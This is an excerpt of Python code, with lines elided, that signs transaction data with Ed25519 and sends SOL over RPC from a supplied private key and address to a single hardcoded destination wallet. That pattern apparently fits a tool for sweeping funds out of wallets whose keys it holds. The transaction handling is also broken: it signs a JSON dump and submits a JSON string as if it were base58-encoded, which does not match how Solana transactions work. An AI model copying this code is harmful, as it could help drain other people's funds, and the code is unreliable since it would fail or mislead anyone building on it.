...
async def sign_and_encode_transaction(private_key: str, transaction_data: dict) -> str:
    """Sign transaction data using Ed25519 and encode it in base58."""
    try:
        # Convert private key from base58 to bytes
        private_key_bytes = b58decode(private_key)
        
        # Extract the first 32 bytes for the seed
        ...
        tx_data = json.dumps(transaction_data).encode()
        
        # Sign the transaction data
        signature = signing_key.sign(tx_data)
        
        # Encode signature in base58
        return b58encode(signature).decode('ascii')
    except Exception as e:
        logger.error(f"Error signing transaction: {e}")
        return None

async def transfer_balance(private_key: str, from_address: str, amount: float) -> bool:
    """Transfer balance using direct RPC calls and Ed25519 signing."""
    try:
        headers = {
        ...
        async with aiohttp.ClientSession() as session:
            async with session.post(SOLANA_RPC_URL, json=blockhash_request, headers=headers) as response:
                blockhash_data = await response.json()
                if "error" in blockhash_data:
                    logger.error(f"Error getting blockhash: {blockhash_data['error']}")
                    return False
            ...
            transaction_data = {
                ...
                "instructions": [{
                    ...
                    "data": b58encode(int(amount * 10**9).to_bytes(8, 'little')).decode('ascii')
                }]
            }
            
            # Sign transaction
            signature = await sign_and_encode_transaction(private_key, transaction_data)
            if not signature:
                return False
            ...
            transfer_request = {
                ...
                "params": [
                    json.dumps(transaction_data),  # Convert transaction to string
                    {"encoding": "base58"}  # Specify encoding
                ]
            }
            
            # Send transaction
            async with session.post(SOLANA_RPC_URL, json=transfer_request, headers=headers) as response:
                result = await response.json()
                if "error" in result:
                    logger.error(f"Transfer error: {result['error']}")
                    return False
                
                logger.info(f"Successfully transferred {amount} SOL from {from_address} to {DESTINATION_WALLET}")
                logger.info(f"Transaction signature: {result['result']}")
                return True
